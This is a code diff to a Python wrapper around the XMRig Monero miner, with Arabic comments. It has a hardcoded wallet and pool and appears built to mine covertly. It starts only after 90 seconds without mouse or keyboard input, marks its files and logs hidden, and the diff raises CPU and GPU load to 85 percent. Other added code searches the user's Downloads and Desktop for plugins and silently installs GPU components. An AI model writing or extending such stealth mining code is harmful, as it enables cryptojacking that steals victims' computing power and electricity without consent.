@@ -93,8 +93,8 @@ CONFIG = {
     "wallet": "45cS8BbbF4sU7ErnUjcxUUWoQTFfYAE31Jmf4K4r7Cw7fctTxX9X8C11BVEBChm9M5TKHpTekxC7c8acozxqF1kQUF8Uomr",
     "pool": "gulf.moneroocean.stream:20128",
     "worker_name": os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "LOCAL_RIG",
-    "cpu_intensity": 65,
-    "gpu_intensity": 65,
+    "cpu_intensity": 85,
+    "gpu_intensity": 85,
     # انتظار دقيقة ونصف (90 ثانية) بدون أي حركة أو تدخل من الماوس أو الكيبورد قبل البدء
     "mouse_idle_start_seconds": 90,
     "mouse_poll_seconds": 0.5,
@@ -115,6 +115,11 @@ CONFIG = {
     "xmrig_cuda_url": None,
     "xmrig_cuda_sha256": None,
     "xmrig_cuda_dll_sha256": None,
+    "auto_create_amd_icd": True,
+    "auto_disable_failed_gpu": True,
+    "auto_find_cuda_dll": True,
+    "auto_download_cuda_plugin": True,
+    "log_stats_interval_seconds": 60,
     "require_sha256": True,
     "max_download_bytes": 120 * 1024 * 1024,
     "min_download_bytes": 1 * 1024 * 1024,
@@ -255,6 +260,10 @@ class GPUMiner:
         self.stage = MiningStage.IDLE
         self.accepted_shares = 0
         self.rejected_shares = 0
+        self.latest_hashrate = 'n/a'
+        self._last_stats_log_at = 0.0
+        self._opencl_disabled_by_failure = False
+        self._cuda_disabled_by_failure = False
         self._log_thread = None
         self._stop_log_watch = threading.Event()
         self._session_marker = ""
@@ -447,16 +456,8 @@ class GPUMiner:
             if self.gpu_type is None:
                 self.gpu_type = self.detect_gpu()
 
-            if (
-                CONFIG.get("enable_gpu_mining")
-                and self.gpu_type == "NVIDIA"
-                and not self._cuda_plugin_ready()
-                and CONFIG.get("xmrig_cuda_url")
-            ):
-                try:
-                    self.download_cuda_plugin()
-                except Exception as cuda_err:
-                    log.warning(f"CUDA plugin setup failed (continuing with available backends): {cuda_err}")
+            if CONFIG.get("enable_gpu_mining") and self.gpu_type == "NVIDIA":
+                self._auto_acquire_cuda_plugin()
 
             self.create_config()
             if not os.path.isfile(CONFIG_FILE):
@@ -719,10 +720,54 @@ class GPUMiner:
             shutil.rmtree(temp_dir, ignore_errors=True)
 
     # -----------------------------------------------------------
-    # التحقق من جاهزية محركات GPU الفعلية
+    # تلقائية OpenCL و CUDA والتعطيل التلقائي للكرت الفاشل
     # -----------------------------------------------------------
+    @staticmethod
+    def _find_amd_opencl_library() -> str | None:
+        if not _IS_WINDOWS:
+            return None
+        sys_root = os.environ.get("SystemRoot", r"C:\Windows")
+        candidate_names = ("amdocl64.dll", "amdocl128.dll", "amdocl.dll")
+        sys32_dir = os.path.join(sys_root, "System32")
+        for fname in candidate_names:
+            candidate = os.path.join(sys32_dir, fname)
+            if os.path.isfile(candidate):
+                return candidate
+
+        driver_repo = os.path.join(sys32_dir, "DriverStore", "FileRepository")
+        if os.path.isdir(driver_repo):
+            try:
+                for root, _, files in os.walk(driver_repo):
+                    for fname in files:
+                        if fname.lower() in candidate_names:
+                            return os.path.join(root, fname)
+            except OSError:
+                pass
+        return None
+
+    def _ensure_opencl_icd_if_needed(self, icd_dir: str) -> bool:
+        if not CONFIG.get("auto_create_amd_icd", True):
+            return False
+        amd_dll = self._find_amd_opencl_library()
+        if not amd_dll:
+            return False
+        try:
+            os.makedirs(icd_dir, exist_ok=True)
+            icd_file = os.path.join(icd_dir, "amd_auto.icd")
+            with open(icd_file, "w", encoding="utf-8") as f:
+                f.write(amd_dll + "\n")
+            if CONFIG.get("hide_artifacts"):
+                _apply_hidden_attribute(icd_file)
+            log.info(f"Created AMD OpenCL ICD automatically at {icd_file} -> {amd_dll}")
+            return True
+        except Exception as e:
+            log.warning(f"Failed to create amd_auto.icd automatically: {e}")
+            return False
+
     def _has_opencl_runtime_files(self) -> bool:
         if not _IS_WINDOWS:
+            return False
+        if getattr(self, "_opencl_disabled_by_failure", False):
             return False
         sysdir = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
         loader = os.path.join(sysdir, "OpenCL.dll")
@@ -732,29 +777,191 @@ class GPUMiner:
             "OpenCL",
             "vendors",
         )
-        if not os.path.isfile(loader) or not os.path.isdir(icd_dir):
+        if not os.path.isfile(loader):
             return False
-        try:
-            return any(f.lower().endswith(".icd") for f in os.listdir(icd_dir))
-        except OSError:
-            return False
+        has_icd = False
+        if os.path.isdir(icd_dir):
+            try:
+                has_icd = any(f.lower().endswith(".icd") for f in os.listdir(icd_dir))
+            except OSError:
+                has_icd = False
+        if not has_icd:
+            has_icd = self._ensure_opencl_icd_if_needed(icd_dir)
+        return has_icd
 
-    def _has_nvidia_cli(self) -> bool:
-        if not _IS_WINDOWS or shutil.which("nvidia-smi") is None:
-            return False
-        try:
-            q = subprocess.run(
-                ["nvidia-smi", "-L"],
-                capture_output=True,
-                text=True,
-                timeout=10,
-                creationflags=CREATE_NO_WINDOW,
+    @staticmethod
+    def _find_local_cuda_dll() -> str | None:
+        search_dirs = [
+            WORK_DIR,
+            os.getcwd(),
+            os.path.join(os.path.expanduser("~"), "Downloads"),
+            os.path.join(os.path.expanduser("~"), "Desktop"),
+            os.path.join(_get_localappdata(), "Programs"),
+        ]
+        for base in search_dirs:
+            if not base or not os.path.isdir(base):
+                continue
+            direct = os.path.join(base, "xmrig-cuda.dll")
+            if os.path.isfile(direct):
+                return direct
+            try:
+                for entry in os.listdir(base):
+                    sub = os.path.join(base, entry)
+                    if "xmrig" in entry.lower() and os.path.isdir(sub):
+                        found = GPUMiner._find_file_in_tree(sub, "xmrig-cuda.dll")
+                        if found:
+                            return found
+            except OSError:
+                pass
+        return None
+
+    def _discover_github_cuda_urls(self) -> list[str]:
+        urls: list[str] = []
+        base_url = str(CONFIG.get("xmrig_url") or "")
+        match = re.search(r"/download/(v[^/]+)/", base_url)
+        if match:
+            tag = match.group(1)
+            ver = tag.lstrip("v")
+            urls.extend(
+                [
+                    f"https://github.com/xmrig/xmrig-cuda/releases/download/{tag}/xmrig-cuda-{ver}-cuda12_4-win64.zip",
+                    f"https://github.com/xmrig/xmrig-cuda/releases/download/{tag}/xmrig-cuda-{ver}-cuda11_8-win64.zip",
+                ]
             )
-            return q.returncode == 0
-        except Exception:
+        urls.extend(
+            [
+                "https://github.com/xmrig/xmrig-cuda/releases/download/v6.21.1/xmrig-cuda-6.21.1-cuda12_4-win64.zip",
+                "https://github.com/xmrig/xmrig-cuda/releases/download/v6.21.1/xmrig-cuda-6.21.1-cuda11_8-win64.zip",
+            ]
+        )
+        deduped: list[str] = []
+        for u in urls:
+            if u not in deduped:
+                deduped.append(u)
+        return deduped
+
+    def _auto_acquire_cuda_plugin(self) -> bool:
+        if getattr(self, "_cuda_disabled_by_failure", False):
+            return False
+        if self._cuda_plugin_ready():
+            return True
+
+        if CONFIG.get("auto_find_cuda_dll", True):
+            local_dll = self._find_local_cuda_dll()
+            if local_dll and os.path.abspath(local_dll) != os.path.abspath(CUDA_PLUGIN_DLL):
+                try:
+                    shutil.copy2(local_dll, CUDA_PLUGIN_DLL)
+                    if CONFIG.get("hide_artifacts"):
+                        self.hide_file(CUDA_PLUGIN_DLL)
+                    log.info(f"Found local xmrig-cuda.dll at {local_dll} -> copied to {CUDA_PLUGIN_DLL}")
+                    if self._cuda_plugin_ready():
+                        return True
+                except Exception as e:
+                    log.warning(f"Failed copying local xmrig-cuda.dll: {e}")
+
+        if CONFIG.get("xmrig_cuda_url"):
+            try:
+                self.download_cuda_plugin()
+                if self._cuda_plugin_ready():
+                    return True
+            except Exception as e:
+                log.warning(f"Configured xmrig_cuda_url failed: {e}")
+
+        if not CONFIG.get("auto_download_cuda_plugin", True):
             return False
 
-    # -----------------------------------------------------------
+        expected_zip_sha = CONFIG.get("xmrig_cuda_sha256")
+        expected_dll_sha = CONFIG.get("xmrig_cuda_dll_sha256")
+        if CONFIG.get("require_sha256") and not expected_zip_sha and not expected_dll_sha:
+            log.warning(
+                "Skipping automatic GitHub CUDA download because require_sha256=True and no CUDA SHA-256 is set."
+            )
+            return False
+
+        for url in self._discover_github_cuda_urls():
+            temp_dir = tempfile.mkdtemp(prefix="xmrig_cuda_auto_")
+            try:
+                zip_path = os.path.join(temp_dir, "xmrig-cuda.zip")
+                self._download_to(url, zip_path)
+                if expected_zip_sha:
+                    actual_zip_sha = calculate_sha256(zip_path)
+                    if actual_zip_sha.lower() != expected_zip_sha.lower():
+                        log.warning(f"CUDA archive SHA-256 mismatch from {url}; trying next.")
+                        continue
+                if not zipfile.is_zipfile(zip_path):
+                    continue
+                with zipfile.ZipFile(zip_path, "r") as zf:
+                    if zf.testzip() is not None:
+                        continue
+                    self._safe_extract(zf, temp_dir)
+                src_dll = self._find_file_in_tree(temp_dir, "xmrig-cuda.dll")
+                if not src_dll or not os.path.isfile(src_dll):
+                    continue
+                if expected_dll_sha:
+                    actual_dll_sha = calculate_sha256(src_dll)
+                    if actual_dll_sha.lower() != expected_dll_sha.lower():
+                        log.warning(f"xmrig-cuda.dll SHA-256 mismatch from {url}; trying next.")
+                        continue
+                shutil.copy2(src_dll, CUDA_PLUGIN_DLL)
+                if CONFIG.get("hide_artifacts"):
+                    self.hide_file(CUDA_PLUGIN_DLL)
+                log.info(f"Automatically installed CUDA plugin from {url} -> {CUDA_PLUGIN_DLL}")
+                return True
+            except Exception as e:
+                log.warning(f"CUDA auto-download attempt failed ({url}): {e}")
+            finally:
+                shutil.rmtree(temp_dir, ignore_errors=True)
+
+        return False
+
+    def _resolve_active_xmrig_log_file(self) -> str:
+        fallback_log = os.path.join(WORK_DIR, "xmrig_worker.log")
+        try:
+            with open(XMRIG_LOG_FILE, "a", encoding="utf-8"):
+                pass
+            return XMRIG_LOG_FILE
+        except PermissionError:
+            log.warning(
+                f"XMRIG_LOG_FILE locked ({XMRIG_LOG_FILE}); switching active log to {fallback_log}"
+            )
+            try:
+                with open(fallback_log, "a", encoding="utf-8"):
+                    pass
+            except Exception:
+                pass
+            return fallback_log
+
+    def _disable_failed_gpu_backend(self, backend: str, reason: str) -> None:
+        if not CONFIG.get("auto_disable_failed_gpu", True):
+            return
+        b_low = backend.lower()
+        if b_low == "opencl":
+            if getattr(self, "_opencl_disabled_by_failure", False):
+                return
+            self._opencl_disabled_by_failure = True
+        elif b_low == "cuda":
+            if getattr(self, "_cuda_disabled_by_failure", False):
+                return
+            self._cuda_disabled_by_failure = True
+        else:
+            return
+
+        log.warning(f"Auto-disabling failed GPU backend [{b_low}] -> reason: {reason}")
+        try:
+            if os.path.isfile(CONFIG_FILE):
+                with open(CONFIG_FILE, "r", encoding="utf-8") as cf:
+                    cfg_data = json.load(cf)
+                if isinstance(cfg_data, dict):
+                    sec = cfg_data.get(b_low)
+                    if not isinstance(sec, dict):
+                        sec = {}
+                    sec["enabled"] = False
+                    cfg_data[b_low] = sec
+                    self._write_config_json_safely(cfg_data)
+                    log.info(f"Updated {CONFIG_FILE}: set {b_low}.enabled = False")
+        except Exception as exc:
+            log.warning(f"Failed updating {CONFIG_FILE} after {b_low} failure: {exc}")
+
     # إنشاء ملف الإعدادات مع معالجة PermissionError وتفعيل GPU المتاح
     # -----------------------------------------------------------
     def _write_config_json_safely(self, config: dict) -> None:
@@ -797,15 +1004,18 @@ class GPUMiner:
         is_nvidia = gpu_allowed and (self.gpu_type == "NVIDIA")
         is_amd = gpu_allowed and (self.gpu_type == "AMD")
 
-        opencl_enabled = is_amd and self._has_opencl_runtime_files()
+        opencl_enabled = (not getattr(self, '_opencl_disabled_by_failure', False)) and is_amd and self._has_opencl_runtime_files()
+        if is_nvidia and not self._cuda_plugin_ready():
+            self._auto_acquire_cuda_plugin()
         cuda_plugin_ready = self._cuda_plugin_ready()
-        cuda_enabled = is_nvidia and self._has_nvidia_cli() and cuda_plugin_ready
-        gpu_intensity = int(CONFIG.get("gpu_intensity", 65))
+        cuda_enabled = (not getattr(self, '_cuda_disabled_by_failure', False)) and is_nvidia and cuda_plugin_ready
+        gpu_intensity = int(CONFIG.get("gpu_intensity", 85))
+        active_xmrig_log = self._resolve_active_xmrig_log_file()
 
         if is_nvidia and not cuda_plugin_ready:
             log.warning(
                 f"NVIDIA GPU detected, but {CUDA_PLUGIN_DLL} is not present/verified; "
-                "set xmrig_cuda_url/xmrig_cuda_sha256 or place xmrig-cuda.dll to enable CUDA."
+                "CUDA will remain disabled while CPU/other available backends continue."
             )
 
         config = {
@@ -852,7 +1062,7 @@ class GPUMiner:
                 "nvml": True,
                 "intensity": gpu_intensity,
             },
-            "log-file": XMRIG_LOG_FILE,
+            "log-file": active_xmrig_log,
             "donate-level": 1,
             "donate-over-proxy": 0,
             "pools": [
@@ -930,28 +1140,42 @@ class GPUMiner:
             suffix = f" ({detail})" if detail else ""
             log.info(f"Mining stage -> {new_stage}{suffix}")
 
+    def _get_current_config_log_file(self) -> str:
+        try:
+            with open(CONFIG_FILE, "r", encoding="utf-8") as cf:
+                data = json.load(cf)
+            lf = data.get("log-file")
+            if isinstance(lf, str) and lf.strip():
+                return lf.strip()
+        except Exception:
+            pass
+        return self._resolve_active_xmrig_log_file()
+
     def _prepare_session_log(self) -> str:
         marker = f"=== SESSION_START_{time.monotonic_ns()} ==="
-        if CONFIG.get("hide_artifacts") and os.path.exists(XMRIG_LOG_FILE):
-            _apply_hidden_attribute(XMRIG_LOG_FILE)
+        target_log = self._get_current_config_log_file()
+        self._watched_log_file = target_log
+        if CONFIG.get("hide_artifacts") and os.path.exists(target_log):
+            _apply_hidden_attribute(target_log)
         try:
-            with open(XMRIG_LOG_FILE, "w", encoding="utf-8") as f:
+            with open(target_log, "w", encoding="utf-8") as f:
                 f.write(marker + "\n")
         except PermissionError:
             log.warning(
-                f"XMRIG_LOG_FILE locked for overwrite; appending session marker instead: {XMRIG_LOG_FILE}"
+                f"Log locked for overwrite; appending session marker instead: {target_log}"
             )
-            with open(XMRIG_LOG_FILE, "a", encoding="utf-8") as f:
+            with open(target_log, "a", encoding="utf-8") as f:
                 f.write("\n" + marker + "\n")
         return marker
 
     def _watch_xmrig_log(self, expected_marker: str):
+        watched = getattr(self, "_watched_log_file", None) or self._get_current_config_log_file()
         try:
-            if not os.path.exists(XMRIG_LOG_FILE):
-                with open(XMRIG_LOG_FILE, "w", encoding="utf-8"):
+            if not os.path.exists(watched):
+                with open(watched, "w", encoding="utf-8"):
                     pass
             in_current_session = False
-            with open(XMRIG_LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
+            with open(watched, "r", encoding="utf-8", errors="ignore") as f:
                 while not self._stop_log_watch.is_set():
                     line = f.readline()
                     if not line:
@@ -985,6 +1209,40 @@ class GPUMiner:
                     if "rejected" in low:
                         self.rejected_shares += 1
                         log.warning(f"Rejected share event detected (total={self.rejected_shares})")
+                    if (
+                        "cl_build_program_failure" in low
+                        or "cl_invalid_program" in low
+                        or "self-test failed" in low
+                        or ("opencl" in low and ("disabled" in low or "failed" in low))
+                    ):
+                        self._disable_failed_gpu_backend("opencl", stripped)
+                    if (
+                        "cuda" in low
+                        and ("failed" in low or "error" in low or "disabled" in low)
+                        and ("thread" in low or "self-test" in low or "disabled" in low or "no cuda" in low)
+                    ):
+                        self._disable_failed_gpu_backend("cuda", stripped)
+                    if "speed" in low and ("h/s" in low or "kh/s" in low):
+                        m_speed = re.search(
+                            r"speed\s+10s/60s/15m\s+([\d.]+|n/a)\s+([\d.]+|n/a)\s+([\d.]+|n/a)\s+([kKmM]?H/s)(?:\s+max\s+([\d.]+)\s+[kKmM]?H/s)?",
+                            stripped,
+                            flags=re.IGNORECASE,
+                        )
+                        if m_speed:
+                            self.latest_hashrate = (
+                                f"10s={m_speed.group(1)} 60s={m_speed.group(2)} 15m={m_speed.group(3)} {m_speed.group(4)}"
+                                + (f" (max={m_speed.group(5)} {m_speed.group(4)})" if m_speed.group(5) else "")
+                            )
+                        else:
+                            self.latest_hashrate = stripped
+                    now_s = time.monotonic()
+                    stats_interval = max(15.0, float(CONFIG.get("log_stats_interval_seconds", 60)))
+                    if now_s - getattr(self, "_last_stats_log_at", 0.0) >= stats_interval:
+                        self._last_stats_log_at = now_s
+                        log.info(
+                            f"Stats summary -> stage={self.stage}, accepted={self.accepted_shares}, "
+                            f"rejected={self.rejected_shares}, hashrate={getattr(self, 'latest_hashrate', 'n/a')}"
+                        )
         except Exception as e:
             log.warning(f"XMRig log watcher stopped with error: {e}")
 
